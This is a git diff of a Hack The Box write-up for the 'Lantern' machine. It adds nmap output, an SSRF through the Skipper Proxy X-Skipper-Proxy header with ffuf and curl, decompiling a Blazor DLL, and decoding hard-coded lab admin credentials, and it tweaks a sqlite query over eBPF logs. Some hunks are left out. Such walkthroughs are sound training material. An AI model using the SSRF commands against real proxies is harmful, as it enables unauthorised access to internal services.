@@ -1,8 +1,225 @@
-# Sea Heist - HTB Writeup
+# Lantern Heist - HTB Writeup
+
+This box is my first hard, therefore, there might be things to change for improving clarity, grammar, and technical accuracy
 
 ## PART 1: USER
 
 ### Getting access to the admin panel
+
+Let’s begin with an nmap scan:
+
+```bash
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 80c947d589f85083025efe5330ac2d0e (ECDSA)
+|_  256 d422cffeb100cbeb6ddcb2b4646b9d89 (ED25519)
+80/tcp   open  http    Skipper Proxy
+|_http-title: Lantern
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.0 404 Not Found
+|     Content-Length: 207
+|     Content-Type: text/html; charset=utf-8
+|     Date: Fri, 23 Aug 2024 12:08:59 GMT
+|     Server: Skipper Proxy
+|     <!doctype html>
+|     <html lang=en>
+|     <title>404 Not Found</title>
+|     <h1>Not Found</h1>
+|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 302 Found
+|     Content-Length: 225
+|     Content-Type: text/html; charset=utf-8
+|     Date: Fri, 23 Aug 2024 12:08:53 GMT
+|     Location: http://lantern.htb/
+|     Server: Skipper Proxy
+|     <!doctype html>
+|     <html lang=en>
+|     <title>Redirecting...</title>
+|     <h1>Redirecting...</h1>
+|     <p>You should be redirected automatically to the target URL: <a href="http://lantern.htb/">http://lantern.htb/</a>. If not, click the link.
+|   HTTPOptions:
+|     HTTP/1.0 200 OK
+|     Allow: HEAD, GET, OPTIONS
+|     Content-Length: 0
+|     Content-Type: text/html; charset=utf-8
+|     Date: Fri, 23 Aug 2024 12:08:53 GMT
+|_    Server: Skipper Proxy
+|_http-server-header: Skipper Proxy
+| http-methods:
+|_  Supported Methods: HEAD GET OPTIONS
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   GetRequest:
+|     HTTP/1.1 500 Internal Server Error
+|     Connection: close
+|     Content-Type: text/plain; charset=utf-8
+|     Date: Fri, 23 Aug 2024 12:08:58 GMT
+|     Server: Kestrel
+|     System.UriFormatException: Invalid URI: The hostname could not be parsed.
+|     System.Uri.CreateThis(String uri, Boolean dontEscape, UriKind uriKind, UriCreationOptions& creationOptions)
+|     System.Uri..ctor(String uriString, UriKind uriKind)
+|     Microsoft.AspNetCore.Components.NavigationManager.set_BaseUri(String value)
+|     Microsoft.AspNetCore.Components.NavigationManager.Initialize(String baseUri, String uri)
+|     Microsoft.AspNetCore.Components.Server.Circuits.RemoteNavigationManager.Initialize(String baseUri, String uri)
+|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticComponentRenderer.<InitializeStandardComponentServicesAsync>g__InitializeCore|5_0(HttpContext httpContext)
+|     Microsoft.AspNetCore.Mvc.ViewFeatures.StaticC
+|   HTTPOptions:
+|     HTTP/1.1 200 OK
+|     Content-Length: 0
+|     Connection: close
+|     Date: Fri, 23 Aug 2024 12:09:03 GMT
+|     Server: Kestrel
+|   Help:
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|     Date: Fri, 23 Aug 2024 12:08:58 GMT
+|     Server: Kestrel
+|   RTSPRequest:
+|     HTTP/1.1 505 HTTP Version Not Supported
+|     Content-Length: 0
+|     Connection: close
+|     Date: Fri, 23 Aug 2024 12:09:03 GMT
+|     Server: Kestrel
+|   SSLSessionReq, TerminalServerCookie:
+|     HTTP/1.1 400 Bad Request
+|     Content-Length: 0
+|     Connection: close
+|     Date: Fri, 23 Aug 2024 12:09:19 GMT
+|_    Server: Kestrel
+```
+
+3 ports, 22 ssh, 80 http and 3000 http too ?
+
+The 3000 can't be an error, there is a reason for this. Let's try to find something.
+
+There's a login page :
+
+![image](./login.png)
+
+But excpet this, nothing really interesting. Going back to 80.
+
+There's a file upload but this is also a dead end. I was a bit stuck until I realize : `Server: Skipper Proxy`. Hmmm, let's have a look on the internet. And here, a nice little [exploit](https://www.exploit-db.com/exploits/51111). So let's try SSRF. I sued burp, and this [port list](https://raw.githubusercontent.com/cujanovic/SSRF-Testing/master/commonly-open-ports.txt), but this was a vey bad idea, way too long. You should defenetly use an other tool. Or use burp pro. And after, a few time, answer on `:5000` :
+
+![image](./SSRF.png)
+
+And when looking the whole response :
+
+![alt text](./framework.png)
+
+The site seems to use the Blazor Framework. This confirm what we found on port 3000. Let's fuze this :
+
+```bash
+ffuf -c -w /opt/seclists/Discovery/Web-Content/common.txt -u "http://$TARGET/FUZZ" -H "X-Skipper-Proxy:http://127.0.0.1:5000/"  -recursion  -fc 302 -fw 389
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.29/FUZZ
+ :: Wordlist         : FUZZ: /opt/seclists/Discovery/Web-Content/common.txt
+ :: Header           : X-Skipper-Proxy: http://127.0.0.1:5000/
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 389
+ :: Filter           : Response status: 302
+________________________________________________
+
+_framework/blazor.boot.json [Status: 200, Size: 20709, Words: 1549, Lines: 231, Duration: 103ms]
+_framework/blazor.webassembly.js [Status: 200, Size: 60904, Words: 1770, Lines: 1, Duration: 91ms]
+:: Progress: [4727/4727] :: Job [1/1] :: 443 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
+```
+
+Great, let's have a look at this json file.
+
+```bash
+curl -H 'Host: lantern.htb' -H 'X-Skipper-Proxy: http://127.0.0.1:5000/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -X GET 'http://lantern.htb/_framework/blazor.boot.json'
+
+{
+  "cacheBootResources": true,
+  "config": [ ],
+  "debugBuild": true,
+  "entryAssembly": "InternaLantern",
+  "icuDataMode": 0,
+  "linkerEnabled": false,
+  "resources": {
+    "assembly": {
+      "Microsoft.AspNetCore.Authorization.dll": "sha256-hGbT4jDhpi63093bjGt+4XVJ3Z9t1FVbmgNmYYmpiNY=",
+        [...] # remove all the usless lines
+      "System.Private.CoreLib.dll": "sha256-6rKu8tPdUGsvbSpesoNMVzbx7bNqPRMPV34eI7vSYaQ=",
+      "InternaLantern.dll": "sha256-pblWkC\/PhCCSxn1VOi3fajA0xS3mX\/\/RC0XvAE\/n5cI="
+    },
+    "extensions": null,
+    "lazyAssembly": null,
+    "libraryInitializers": null,
+    "pdb": {
+      "InternaLantern.pdb": "sha256-E8WICkNg65vorw8OEDOe6K9nJxL0QSt1S4SZoX5rTOY="
+    },
+    "runtime": {
+      "dotnet.timezones.blat": "sha256-KsGUR9nqtXb3Hy6IrNlnc1HoSS+AFlsXTX9rq4oChtA=",
+      "icudt.dat": "sha256-Zuq0dWAsBm6\/2lSOsz7+H9PvFaRn61KIXHMMwXDfvyE=",
+      "icudt_CJK.dat": "sha256-WPyI4hWDPnOw62Nr27FkzGjdbucZnQD+Ph+GOPhAedw=",
+      "icudt_EFIGS.dat": "sha256-4RwaPx87Z4dvn77ie\/ro3\/QzyS+\/gGmO3Y\/0CSAXw4k=",
+      "icudt_no_CJK.dat": "sha256-OxylFgLJlFqixsj+nLxYVsv5iZLvfIKMpLf9hrWaChA=",
+      "dotnet.wasm": "sha256-JlqjjT2GZWeJko9+pitVfjjmJeEbi4AibzTQr5zTISo=",
+      "dotnet..lzvsyl6wav.js": "sha256-6AcYHsbEEdBjeNDUUvrQZuRqASd62mZgQgxz4uzTVGU="
+    },
+    "satelliteResources": null
+  }
+}#
+```
+
+`InternaLantern.dll`. Let's download this and have a look with `ilspycmd`.
+
+```bash
+#!/bin/bash
+set -x
+URL="http://lantern.htb/_framework/InternaLantern.dll"
+HOST="lantern.htb"
+PROXY="http://127.0.0.1:5000/"
+USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
+
+curl -o InternaLantern.dll -H "Host: $HOST" -H "X-Skipper-Proxy: $PROXY" -H "User-Agent: $USER_AGENT" -X GET \ $URL
+```
+
+```bash
+ilspycmd InternaLantern.dll -o data
+```
+
+And we get a 854 lines decompile Csharp, let's read all of this. And we finally found some base64 strings.
+
+[image](./base64.png)
+
+And reading them :
+
+```bash
+echo 'U3lzdGVtIGFkbWluaXN0cmF0b3IsIEZpcnN0IGRheTogMjEvMS8yMDI0LCBJbml0aWFsIGNyZWRlbnRpYWxzIGFkbWluOkFKYkZBX1FAOTI1cDlhcCMyMi4gQXNrIHRvIGNoYW5nZSBhZnRlciBmaXJzdCBsb2dpbiE=' | base64 -d
+System administrator, First day: 21/1/2024, Initial credentials admin:AJbFA_Q@925p9ap#22. Ask to change after first login!#
+```
+
+Great ! Lets's go back to port 3000 and try this creds.
+
+[image](./admin.png)
+
+And let's go ! We are inside !
 
 ### Upload reverse shell
 
@@ -248,13 +465,9 @@ sqlite> SELECT *, hex(arguments) FROM ebpf  WHERE syscall LIKE 'write' AND proce
 425106|140343397558407$/usr/lib/x86_64-linux-gnu/libc.so.6!__write|nano|nano|6|18854003052688|write|19467||01000000000000001B5B3F32356C1B28426563686F3443284220526500060000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 ```
 
-Indeed. Now let's dig further. When looking back at this image:
+Indeed. Now let's dig further. And just to be sure, we can also sort by timestamp, to be sure to keep only what we need. The SQL request should look like this : `SELECT hex(arguments) FROM ebpf WHERE syscall LIKE 'write' AND processname LIKE 'nano' ORDER BY timestamp ;`
 
-![image](./procmon.png)
-
-There is some write operation with a 0 resultcode. And the buffer seems empty. So let's get rid of these. And just to be sure, we can also sort by timestamp, to be sure to keep only what we need. The SQL request should look like this : `SELECT hex(arguments) FROM ebpf WHERE syscall LIKE 'write' AND processname LIKE 'nano' and resultcode > 0 ORDER BY timestamp ;`
-
-Let's get all of that data in a file : `sqlite3 procmon.db "SELECT hex(arguments) FROM ebpf WHERE syscall LIKE 'write' AND processname LIKE 'nano' and resultcode > 0 ORDER BY timestamp ;" > procmon.txt`
+Let's get all of that data in a file : `sqlite3 procmon.db "SELECT hex(arguments) FROM ebpf WHERE syscall LIKE 'write' AND processname LIKE 'nano' ORDER BY timestamp ;" > procmon.txt`
 
 And now, let's put this hexa to something kind of readable. `cat procmon.txt  | xxd -r -p > procmon-dec.txt`.
 
@@ -276,7 +489,7 @@ And here we are !
 
 ## Final Toughts
 
-There is a few issue that I need to resolve. For example why
+There is a few issue that I need to resolve. For example why the
 
 ```
 55 -> curl
